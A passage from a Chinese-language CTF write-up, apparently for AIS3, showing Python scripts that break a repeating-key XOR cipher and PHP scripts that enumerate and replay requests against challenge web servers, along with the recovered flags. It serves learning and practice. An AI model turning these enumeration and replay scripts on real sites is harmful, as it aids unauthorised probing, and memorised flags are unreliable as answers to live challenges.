思考了一下，我們有一點已知的明文:<code>AIS3{</code>，而這串明文也位於整個密文的開頭，因此我們可以將密文的前5個byte跟這串明文做xor，這樣就能得到key的前5個byte:<code>16 09 7c c7 dd</code>
接著得想辦法知道key實際到底多長，我們已經知道加密的key是由原本的key重複很多次串起來的，也就是說在中間還有很多段是一樣用這五個byte來加密的，而如果是flag，就算只有五個字元應該也是能夠分辨出來，所以就寫一個script，把密文從頭到尾都試試看</p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">random</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;5key&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">data</span><span class="p">:</span>
    <span class="n">key5</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag-encrypted&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">data</span><span class="p">:</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">extend</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">L</span><span class="p">):</span>
    <span class="n">kL</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">key</span> <span class="o">*</span> <span class="p">(</span><span class="n">L</span> <span class="o">//</span> <span class="n">kL</span><span class="p">)</span> <span class="o">+</span> <span class="n">key</span><span class="p">[:</span><span class="n">L</span> <span class="o">%</span> <span class="n">kL</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="n">Y</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">x</span> <span class="o">^</span> <span class="n">y</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="n">Y</span><span class="p">)])</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">-</span><span class="mi">5</span><span class="p">):</span>
    <span class="n">plain</span> <span class="o">=</span> <span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">5</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">cipher</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">key5</span><span class="p">,</span><span class="n">plain</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%d</span><span class="s2"> : </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">cipher</span><span class="p">))</span>
</pre></div>


<p>跑出來的結果(中間省略一些不是flag的東西):</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39;AIS3{&#39;</span>
<span class="mi">1</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39;V&amp;\x88a\xf1&#39;</span>
<span class="mi">2</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39;9\xfd\xda\xeb\x92&#39;</span>
<span class="mi">3</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39;\xe2\xafP\x88?&#39;</span>
<span class="mi">4</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39;\xb0%3%\x0e&#39;</span>
<span class="mi">5</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39;:F\x9e\x14c&#39;</span>
<span class="mi">10</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39;In aM&#39;</span>
<span class="mi">20</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39; - Wh&#39;</span>
<span class="mi">30</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39;R Hap&#39;</span>
<span class="mi">40</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39;t0mOR&#39;</span>
<span class="mi">50</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39;OU mU&#39;</span>
<span class="mi">60</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39;0Mis3&#39;</span>
<span class="mi">70</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39;n3 tH&#39;</span>
<span class="mi">80</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39;TH4T &#39;</span>
<span class="mi">90</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39;iLL s&#39;</span>
<span class="mi">100</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39;ho Y0&#39;</span>
<span class="mi">110</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39;. Not&#39;</span>
<span class="mi">120</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39;Rfect&#39;</span>
<span class="mi">130</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39;IER, &#39;</span>
<span class="mi">140</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39; gOOD&#39;</span>
<span class="mi">150</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39;}\x16\t|\xc7&#39;</span>
<span class="mi">155</span> <span class="o">:</span> <span class="n">b</span><span class="s1">&#39;\x84h\xc0\xf2\x85&#39;</span>
</pre></div>


<p>這樣我們就能算出key的長度是10，因為兩次正確解密之間差了10個byte
接著我們還能發現flag的長度是151，最後停在150的位置，因為這樣的偏移，使我們能夠算出完整flag，下面用一張表來說明
這張表使用kn來代表key的第n個byte</p>
<table>
<thead>
<tr>
<th>原文</th>
<th>}</th>
<th>k1</th>
<th>k2</th>
<th>k3</th>
<th>k4</th>
<th>k5</th>
<th>k6</th>
</tr>
</thead>
<tbody>
<tr>
<td>加密用的key</td>
<td>k1</td>
<td>k2</td>
<td>k3</td>
<td>k4</td>
<td>k5</td>
<td>k6</td>
<td>k7</td>
</tr>
<tr>
<td>密文</td>
<td>}^k1</td>
<td>k1^k2</td>
<td>k2^k3</td>
<td>k3^k4</td>
<td>k4^k5</td>
<td>k5^k6</td>
<td>k6^k7</td>
</tr>
</tbody>
</table>
<p>先看原文為k5的那個byte，將那個byte的密文跟k5做xor，就能得到k6
有了k6，就可以在往下一個byte算出k7，如此下去，就能算出完整的key了，有了完整的key，就能解出原文</p>
<p>找出key的code:</p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;5key&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">data</span><span class="p">:</span>
    <span class="n">key5</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag-encrypted&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">data</span><span class="p">:</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">extend</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">L</span><span class="p">):</span>
    <span class="n">kL</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">key</span> <span class="o">*</span> <span class="p">(</span><span class="n">L</span> <span class="o">//</span> <span class="n">kL</span><span class="p">)</span> <span class="o">+</span> <span class="n">key</span><span class="p">[:</span><span class="n">L</span> <span class="o">%</span> <span class="n">kL</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="n">Y</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">x</span> <span class="o">^</span> <span class="n">y</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="n">Y</span><span class="p">)])</span>

<span class="n">key</span> <span class="o">=</span> <span class="n">key5</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;key&#39;</span><span class="p">,</span> <span class="s1">&#39;+wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">data</span><span class="p">:</span>
    <span class="n">data</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">155</span><span class="p">,</span><span class="mi">160</span><span class="p">):</span>
        <span class="n">tk</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">key</span><span class="p">[</span><span class="mi">4</span><span class="o">+</span><span class="n">i</span><span class="o">-</span><span class="mi">155</span><span class="p">]</span><span class="o">^</span><span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">]])</span>
        <span class="n">data</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">tk</span><span class="p">)</span>
        <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">+</span><span class="n">tk</span>
</pre></div>


<p>解密的code:</p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;key&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">data</span><span class="p">:</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag-encrypted&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">data</span><span class="p">:</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">extend</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">L</span><span class="p">):</span>
    <span class="n">kL</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">key</span> <span class="o">*</span> <span class="p">(</span><span class="n">L</span> <span class="o">//</span> <span class="n">kL</span><span class="p">)</span> <span class="o">+</span> <span class="n">key</span><span class="p">[:</span><span class="n">L</span> <span class="o">%</span> <span class="n">kL</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="n">Y</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">x</span> <span class="o">^</span> <span class="n">y</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="n">Y</span><span class="p">)])</span>

<span class="n">plain</span> <span class="o">=</span> <span class="n">flag</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">extend</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">plain</span><span class="p">))</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">plain</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">data</span><span class="p">:</span>
    <span class="n">data</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span>
</pre></div>


<p>Flag: <code>AIS3{captAIn aMeric4 - Wh4T3V3R HapPenS t0mORr0w YOU mUst PR0Mis3 ME on3 tHIng. TH4T yOu WiLL stAY Who Y0U 4RE. Not A pERfect sO1dIER, buT 4 gOOD MAn.}</code>
超級長</p>
<h2 id="web1">Web1</h2>
<p>http://104.199.235.135:31331/index.php?p=7
進去會看到<code>Did you see the flag</code>
原本以為跟去年一樣是http 302，結果不是
後來發現header有<code>Partial-Flag</code>，然後改了一下參數，發現有不同的字，寫個script抓一抓就出來了</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">for</span><span class="p">(</span><span class="nv">$p</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nv">$p</span><span class="o">&lt;=</span><span class="mi">2050</span><span class="p">;</span><span class="nv">$p</span><span class="o">++</span><span class="p">){</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">get_headers</span><span class="p">(</span><span class="s2">&quot;http://104.199.235.135:31331/index.php?p=</span><span class="si">$p</span><span class="s2">&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="k">echo</span> <span class="nv">$p</span><span class="p">;</span>
    <span class="k">echo</span> <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;Partial-Flag&#39;</span><span class="p">];</span>
    <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<h2 id="web2">Web2</h2>
<p>進去後顯示<code>There is a secret page in the website. Can you find it?</code>
馬上想到robots.txt
打開後發現</p>
<div class="codehilite"><pre><span></span>User-agent: *
Disallow: /admin
Disallow: /cgi-bin/
Disallow: /images/
Disallow: /tmp/
Disallow: /private/
Disallow: /_hidden_flag_.php
</pre></div>


<p>看來是在_hidden_flag_.php，進去後顯示<code>Hmm ... no flag here!</code>，然後有個倒數，倒數完會跳出一個按鈕<code>Get flag in the next page.</code>，點下去就是一樣的動作，但是從原始碼會發現這樣的東西</p>
<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;utf-8&quot;</span><span class="p">/&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;_hidden_flag_.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
Hmm ... no flag here!<span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;c&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;1&quot;</span><span class="p">/&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;s&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;3241b876891b9ea67db897e940db6ea9e7e351447546b8da82bbf3693dfe9ebb&quot;</span><span class="p">/&gt;</span>
<span class="p">&lt;</span><span class="nt">span</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;disp&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</pre></div>


<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;utf-8&quot;</span><span class="p">/&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;_hidden_flag_.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
Hmm ... no flag here!<span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;c&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;2&quot;</span><span class="p">/&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;s&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;6d16a8d466b16f456bf9a3faeef31db59612cbb11ce64e0196b07d25ed2cff4e&quot;</span><span class="p">/&gt;</span>
<span class="p">&lt;</span><span class="nt">span</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;disp&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</pre></div>


<p>__hidden_flag_.js</p>
<div class="codehilite"><pre><span></span><span class="kd">var</span> <span class="nx">_0x13ed</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;getElementById&#39;</span><span class="p">,</span><span class="s1">&#39;disp&#39;</span><span class="p">,</span><span class="s1">&#39;setInterval&#39;</span><span class="p">,</span><span class="s1">&#39;onload&#39;</span><span class="p">,</span><span class="s1">&#39;clearInterval&#39;</span><span class="p">,</span><span class="s1">&#39;innerHTML&#39;</span><span class="p">,</span><span class="s1">&#39;&lt;input\x20type=\x22submit\x22\x20value=\x22Get\x20flag\x20in\x20the\x20next\x20page.\x22/&gt;&#39;</span><span class="p">];(</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x4ff87b</span><span class="p">,</span><span class="nx">_0x35e2bc</span><span class="p">){</span><span class="kd">var</span> <span class="nx">_0x2c01be</span><span class="o">=</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x216360</span><span class="p">){</span><span class="k">while</span><span class="p">(</span><span class="o">--</span><span class="nx">_0x216360</span><span class="p">){</span><span class="nx">_0x4ff87b</span><span class="p">[</span><span class="s1">&#39;push&#39;</span><span class="p">](</span><span class="nx">_0x4ff87b</span><span class="p">[</span><span class="s1">&#39;shift&#39;</span><span class="p">]());}};</span><span class="nx">_0x2c01be</span><span class="p">(</span><span class="o">++</span><span class="nx">_0x35e2bc</span><span class="p">);}(</span><span class="nx">_0x13ed</span><span class="p">,</span><span class="mh">0x13f</span><span class="p">));</span><span class="kd">var</span> <span class="nx">_0x5d44</span><span class="o">=</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x592680</span><span class="p">,</span><span class="nx">_0x1e9b97</span><span class="p">){</span><span class="nx">_0x592680</span><span class="o">=</span><span class="nx">_0x592680</span><span class="o">-</span><span class="mh">0x0</span><span class="p">;</span><span class="kd">var</span> <span class="nx">_0x50206c</span><span class="o">=</span><span class="nx">_0x13ed</span><span class="p">[</span><span class="nx">_0x592680</span><span class="p">];</span><span class="k">return</span> <span class="nx">_0x50206c</span><span class="p">;};</span><span class="kd">var</span> <span class="nx">left</span><span class="o">=</span><span class="mh">0x0</span><span class="p">;</span><span class="kd">var</span> <span class="nx">timer</span><span class="o">=</span><span class="kc">null</span><span class="p">;</span><span class="kd">var</span> <span class="nx">disp</span><span class="o">=</span><span class="kc">null</span><span class="p">;</span><span class="kd">function</span> <span class="nx">countdown</span><span class="p">(){</span><span class="nx">left</span><span class="o">=</span><span class="nx">left</span><span class="o">-</span><span class="mh">0x1</span><span class="p">;</span><span class="k">if</span><span class="p">(</span><span class="nx">timer</span><span class="o">!=</span><span class="kc">null</span><span class="o">&amp;&amp;</span><span class="nx">left</span><span class="o">==</span><span class="mh">0x0</span><span class="p">){</span><span class="nb">window</span><span class="p">[</span><span class="nx">_0x5d44</span><span class="p">(</span><span class="s1">&#39;0x0&#39;</span><span class="p">)](</span><span class="nx">timer</span><span class="p">);</span><span class="nx">timer</span><span class="o">=</span><span class="kc">null</span><span class="p">;</span><span class="nx">disp</span><span class="p">[</span><span class="nx">_0x5d44</span><span class="p">(</span><span class="s1">&#39;0x1&#39;</span><span class="p">)]</span><span class="o">=</span><span class="nx">_0x5d44</span><span class="p">(</span><span class="s1">&#39;0x2&#39;</span><span class="p">);}</span><span class="k">else</span><span class="p">{</span><span class="nx">disp</span><span class="p">[</span><span class="nx">_0x5d44</span><span class="p">(</span><span class="s1">&#39;0x1&#39;</span><span class="p">)]</span><span class="o">=</span><span class="s1">&#39;(&#39;</span><span class="o">+</span><span class="nx">left</span><span class="o">+</span><span class="s1">&#39;)&#39;</span><span class="p">;}}</span><span class="kd">function</span> <span class="nx">setup</span><span class="p">(){</span><span class="nx">disp</span><span class="o">=</span><span class="nb">document</span><span class="p">[</span><span class="nx">_0x5d44</span><span class="p">(</span><span class="s1">&#39;0x3&#39;</span><span class="p">)](</span><span class="nx">_0x5d44</span><span class="p">(</span><span class="s1">&#39;0x4&#39;</span><span class="p">));</span><span class="nx">left</span><span class="o">=</span><span class="mh">0xa</span><span class="o">+</span><span class="nb">parseInt</span><span class="p">(</span><span class="nb">Math</span><span class="p">[</span><span class="s1">&#39;random&#39;</span><span class="p">]()</span><span class="o">*</span><span class="mh">0xa</span><span class="p">);</span><span class="nx">timer</span><span class="o">=</span><span class="nb">window</span><span class="p">[</span><span class="nx">_0x5d44</span><span class="p">(</span><span class="s1">&#39;0x5&#39;</span><span class="p">)](</span><span class="nx">countdown</span><span class="p">,</span><span class="mh">0x3e8</span><span class="p">);</span><span class="nx">disp</span><span class="p">[</span><span class="nx">_0x5d44</span><span class="p">(</span><span class="s1">&#39;0x1&#39;</span><span class="p">)]</span><span class="o">=</span><span class="s1">&#39;(&#39;</span><span class="o">+</span><span class="nx">left</span><span class="o">+</span><span class="s1">&#39;)&#39;</span><span class="p">;}</span><span class="nb">window</span><span class="p">[</span><span class="nx">_0x5d44</span><span class="p">(</span><span class="s1">&#39;0x6&#39;</span><span class="p">)]</span><span class="o">=</span><span class="nx">setup</span><span class="p">;</span>
</pre></div>


<p>然後就會發現post過去1，會給2，post過去2，會給3，跟javascript根本沒關係
然後在仔細觀察一下header，會發現有一個<code>Flag: AIS3{NOT_A_VALID_FLAG}</code>，很顯然是錯的，那就應該是多跑幾次，就會出現對的。
那就寫一個script</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>

<span class="nv">$url</span> <span class="o">=</span> <span class="s2">&quot;104.199.235.135:31332/_hidden_flag_.php&quot;</span><span class="p">;</span>

<span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span> <span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_POST</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>

<span class="c1">//$c = &quot;46828&quot;;</span>
<span class="c1">//$s = &quot;4818d80ac35251a43047417fe68ac4c94aab3586adc8d0b41063f796ecbef122&quot;;</span>

<span class="nv">$c</span> <span class="o">=</span> <span class="s2">&quot;5521&quot;</span><span class="p">;</span>
<span class="nv">$s</span> <span class="o">=</span> <span class="s2">&quot;56483453de40c26df92cc87deb70b173c405483f2571e8a24d2d48e48f0f0dc4&quot;</span><span class="p">;</span>

<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_POSTFIELDS</span><span class="p">,</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;c&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;</span><span class="si">$c</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;s&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;</span><span class="si">$s</span><span class="s2">&quot;</span><span class="p">)));</span> 
    <span class="nv">$output</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
    <span class="c1">//str_replace(array(&quot;\r\n&quot;,&quot;\t&quot;,&quot;  &quot;,&quot;\n&quot;),&quot;&quot;,$output);</span>
    <span class="c1">//echo $output;</span>
    <span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;/name=</span><span class="se">\&quot;</span><span class="s2">c</span><span class="se">\&quot;</span><span class="s2">\svalue=</span><span class="se">\&quot;</span><span class="s2">.+/&quot;</span><span class="p">,</span><span class="nv">$output</span><span class="p">,</span><span class="nv">$cm</span><span class="p">);</span>
    <span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;/[0-9]+/&quot;</span><span class="p">,</span><span class="nv">$cm</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$cm</span><span class="p">);</span>
    <span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;/name=</span><span class="se">\&quot;</span><span class="s2">s</span><span class="se">\&quot;</span><span class="s2">\svalue=</span><span class="se">\&quot;</span><span class="s2">.+/&quot;</span><span class="p">,</span><span class="nv">$output</span><span class="p">,</span><span class="nv">$sm</span><span class="p">);</span>
    <span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;/value=</span><span class="se">\&quot;</span><span class="s2">.+/&quot;</span><span class="p">,</span><span class="nv">$sm</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$sm</span><span class="p">);</span>
    <span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;/</span><span class="se">\&quot;</span><span class="s2">.+/&quot;</span><span class="p">,</span><span class="nv">$sm</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$sm</span><span class="p">);</span>
    <span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;/[0-9a-z]+/&quot;</span><span class="p">,</span><span class="nv">$sm</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$sm</span><span class="p">);</span>
    <span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;/Flag.+/&quot;</span><span class="p">,</span><span class="nv">$output</span><span class="p">,</span><span class="nv">$flag</span><span class="p">);</span>
    <span class="c1">//var_dump($cm);</span>
    <span class="c1">//var_dump($sm);</span>
    <span class="nv">$cm</span> <span class="o">=</span> <span class="nv">$cm</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="nv">$sm</span> <span class="o">=</span> <span class="nv">$sm</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="nv">$flag</span> <span class="o">=</span> <span class="nv">$flag</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="k">echo</span> <span class="nv">$cm</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sm</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$flag</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$flag</span><span class="p">,</span><span class="s2">&quot;NOT_A_VALID_FLAG&quot;</span><span class="p">)){</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$cm</span><span class="p">;</span>
    <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$sm</span><span class="p">;</span>
<span class="p">}</span>
